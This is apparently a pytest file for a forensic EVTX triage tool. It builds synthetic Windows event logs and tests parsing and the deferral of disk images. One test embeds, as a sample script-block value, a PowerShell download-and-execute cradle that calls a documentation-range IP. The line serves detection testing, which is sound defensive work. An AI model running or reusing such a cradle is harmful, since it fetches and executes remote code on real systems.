# Treska Phase 6 tests — EVTX triage and detect-and-defer.
# © 2026 ShadowStrike. All rights reserved.
# Aut Viam Inveniam Aut Faciam

from __future__ import annotations

import os
import struct
import zipfile
import zlib
from datetime import datetime, timezone

from treska.core.pipeline import parse_zip
from treska.parsers.evtx import HIGH_VALUE_IDS, SAMPLE_CAP, parse_evtx

# --- synthetic EVTX builder ----------------------------------------------------
# Hand-crafted, never real case data. Each record carries its own resident
# template with inline BinXML values and zero substitutions: the smallest
# layout python-evtx renders. Element size fields are left 0 (it ignores them).

_CHUNK_SIZE = 0x10000
_CHUNK_HEADER = 0x200
_FILE_HEADER = 0x1000
_EVENT_NS = "http://schemas.microsoft.com/win/2004/08/events/event"
_FILETIME_EPOCH = datetime(1601, 1, 1, tzinfo=timezone.utc)


class _BinXml:
    """Append-only BinXML writer; base = chunk-relative offset of byte 0."""

    def __init__(self, base: int) -> None:
        self.base = base
        self.buf = bytearray()

    def _pos(self) -> int:
        return self.base + len(self.buf)

    def _name(self, name: str) -> None:
        # Inline NameStringNode: next_offset, hash, length, UTF-16LE, NUL.
        self.buf += struct.pack("<IHH", 0, 0, len(name)) + name.encode("utf-16-le") + b"\x00\x00"

    def _value(self, text: str) -> None:
        self.buf += struct.pack("<BBH", 0x05, 0x01, len(text)) + text.encode("utf-16-le")

    def element(self, name: str, attrs: dict[str, str] | None = None,
                text: str | None = None, children: list | None = None) -> None:
        start = self._pos()
        self.buf += struct.pack("<BHII", 0x41 if attrs else 0x01, 0, 0, start + 11)
        self._name(name)
        if attrs:
            self.buf += struct.pack("<I", 0)  # attribute list size (unused)
            items = list(attrs.items())
            for i, (key, value) in enumerate(items):
                token = 0x46 if i < len(items) - 1 else 0x06
                self.buf += struct.pack("<BI", token, self._pos() + 5)
                self._name(key)
                self._value(value)
        if text is None and not children:
            self.buf.append(0x03)  # close empty element
            return
        self.buf.append(0x02)  # close start element
        if text is not None:
            self._value(text)
        for child in children or []:
            self.element(*child)
        self.buf.append(0x04)  # end element


def _event_tree(event_id: int, when: str, computer: str, data: dict[str, str]) -> tuple:
    system = [
        ("Provider", {"Name": "Treska-Synthetic"}),
        ("EventID", None, str(event_id)),
        ("TimeCreated", {"SystemTime": when}),
        ("Computer", None, computer),
    ]
    event_data = [("Data", {"Name": key}, value) for key, value in data.items()]
    return ("Event", {"xmlns": _EVENT_NS}, None, [("System", None, None, system),
                                                 ("EventData", None, None, event_data)])


def _record(offset: int, number: int, event: dict) -> bytes:
    root_base = offset + 0x18
    template_offset = root_base + 4 + 10
    body = _BinXml(template_offset + 0x18)
    body.buf += b"\x0f\x01\x01\x00"  # stream start
    body.element(*_event_tree(**event))
    body.buf.append(0x00)  # end of stream
    root = (
        b"\x0f\x01\x01\x00"
        + struct.pack("<BBII", 0x0C, 0x01, number, template_offset)  # template instance
        + struct.pack("<II", 0, number) + b"\x00" * 12 + struct.pack("<I", len(body.buf))
        + bytes(body.buf)
        + struct.pack("<I", 0)  # substitution count
    )
    size = 0x18 + len(root) + 4
    when = datetime.fromisoformat(event["when"].replace("Z", "+00:00"))
    filetime = int((when - _FILETIME_EPOCH).total_seconds() * 10_000_000)
    return struct.pack("<IIQQ", 0x2A2A, size, number, filetime) + root + struct.pack("<I", size)


def build_evtx(events: list[dict]) -> bytes:
    """events: dicts with event_id, when (ISO Z), computer, data. One chunk."""
    chunk = bytearray(_CHUNK_SIZE)
    offset = _CHUNK_HEADER
    last = 0
    for number, event in enumerate(events, start=1):
        rec = _record(offset, number, event)
        assert offset + len(rec) <= _CHUNK_SIZE, "synthetic EVTX overflowed one chunk"
        chunk[offset:offset + len(rec)] = rec
        last, offset = offset, offset + len(rec)
    count = len(events)
    struct.pack_into("<8sQQQQIIII", chunk, 0, b"ElfChnk\x00", 1, count, 1, count, 0x80, last, offset,
                     zlib.crc32(chunk[_CHUNK_HEADER:offset]))
    struct.pack_into("<I", chunk, 0x7C, zlib.crc32(chunk[:0x78] + chunk[0x80:_CHUNK_HEADER]))

    header = bytearray(_FILE_HEADER)
    struct.pack_into("<8sQQQIHHHH", header, 0, b"ElfFile\x00", 0, 0, count + 1, 0x80, 1, 3, _FILE_HEADER, 1)
    struct.pack_into("<I", header, 0x7C, zlib.crc32(header[:0x78]))
    return bytes(header + chunk)


def _event(event_id: int, n: int = 0, **data: str) -> dict:
    return {
        "event_id": event_id,
        "when": f"2026-03-14T09:26:{n % 60:02d}.123Z",
        "computer": "DESKTOP-SYNTH01",
        "data": data,
    }


def _zip(tmp_path, members: dict[str, bytes]):
    path = tmp_path / "case.zip"
    with zipfile.ZipFile(path, "w") as zf:
        for name, data in members.items():
            zf.writestr(name, data)
    return path


def _entry(result, path: str):
    return next(e for e in result.inventory if e.path == path)


# --- parser --------------------------------------------------------------------

def test_evtx_parse_basic():
    out = parse_evtx(build_evtx([_event(4624), _event(7036)]), filename="System.evtx")
    assert out["status"] == "parsed"
    assert out["event_count"] == 2
    assert out["filename"] == "System.evtx"


def test_evtx_high_value_ids():
    out = parse_evtx(build_evtx([_event(4624, TargetUserName="alice"), _event(7036)]))
    hv = {h["event_id"]: h for h in out["high_value_events"]}
    assert set(hv) == {4624}
    assert hv[4624]["label"] == HIGH_VALUE_IDS[4624]
    assert hv[4624]["samples"][0]["computer"] == "DESKTOP-SYNTH01"
    assert hv[4624]["samples"][0]["time_created"] == "2026-03-14T09:26:00.123Z"


def test_evtx_sample_cap():
    out = parse_evtx(build_evtx([_event(4625, n) for n in range(SAMPLE_CAP + 4)]))
    (hv,) = out["high_value_events"]
    assert hv["count"] == SAMPLE_CAP + 4
    assert len(hv["samples"]) == SAMPLE_CAP == 3


def test_evtx_corrupt():
    assert parse_evtx(os.urandom(4096))["status"] == "corrupt"
    truncated = build_evtx([_event(4624)])[:_FILE_HEADER + 0x300]
    assert parse_evtx(truncated)["status"] == "corrupt"


def test_evtx_empty():
    out = parse_evtx(build_evtx([]))
    assert out["status"] == "empty"
    assert out["event_count"] == 0


def test_evtx_event_data_extraction():
    payload = "IEX (New-Object Net.WebClient).DownloadString('http://203.0.113.7/a')"
    out = parse_evtx(build_evtx([_event(4104, ScriptBlockText=payload, ScriptBlockId="synthetic")]))
    sample = out["high_value_events"][0]["samples"][0]
    assert sample["event_data"]["ScriptBlockText"] == payload
    assert all(isinstance(k, str) and isinstance(v, str) for k, v in sample["event_data"].items())


def test_evtx_top_ids_ordering():
    events = [_event(7036)] * 5 + [_event(4624)] * 2 + [_event(1102)] * 7 + [_event(4625)]
    top = parse_evtx(build_evtx(events))["top_event_ids"]
    assert [t["event_id"] for t in top] == [1102, 7036, 4624, 4625]
    counts = [t["count"] for t in top]
    assert counts == sorted(counts, reverse=True)


def test_evtx_schema_keys():
    out = parse_evtx(build_evtx([_event(4104, ScriptBlockText="x")]), filename="a.evtx")
    assert {"filename", "format", "status", "event_count", "top_event_ids", "high_value_events"} <= set(out)
    assert out["format"] == "evtx"
    (hv,) = out["high_value_events"]
    assert set(hv) == {"event_id", "label", "count", "samples"}
    assert set(hv["samples"][0]) == {"time_created", "computer", "event_data"}


# --- pipeline dispatch -----------------------------------------------------------

def test_evtx_in_zip(tmp_path):
    zip_path = _zip(tmp_path, {"logs/Security.evtx": build_evtx([_event(4624), _event(4625)])})
    result = parse_zip(zip_path)
    triage = _entry(result, "logs/Security.evtx").triage
    assert triage["status"] == "parsed"
    assert triage["filename"] == "logs/Security.evtx"
    assert triage["event_count"] == 2
    assert result.deferred_files == []


def test_evtx_deferred_e01(tmp_path):
    # Named .bin to prove magic, not extension, decides the format.
    e01 = b"EVF\x09\x0d\x0a\xff\x00" + os.urandom(512)
    result = parse_zip(_zip(tmp_path, {"disk/evidence.bin": e01}))
    triage = _entry(result, "disk/evidence.bin").triage
    assert triage == {
        "filename": "disk/evidence.bin",
        "format": "e01",
        "status": "deferred",
        "message": "Use FTK Imager or ewfmount to extract before submitting to Treska.",
    }
    assert result.deferred_files == [triage]


def test_evtx_deferred_vhdx(tmp_path):
    vhdx = b"vhdxfile" + b"\x00" * 1024
    result = parse_zip(_zip(tmp_path, {"vm.vhdx": vhdx}))
    triage = _entry(result, "vm.vhdx").triage
    assert triage["status"] == "deferred"
    assert triage["format"] == "vhdx"
    assert [d["filename"] for d in result.deferred_files] == ["vm.vhdx"]
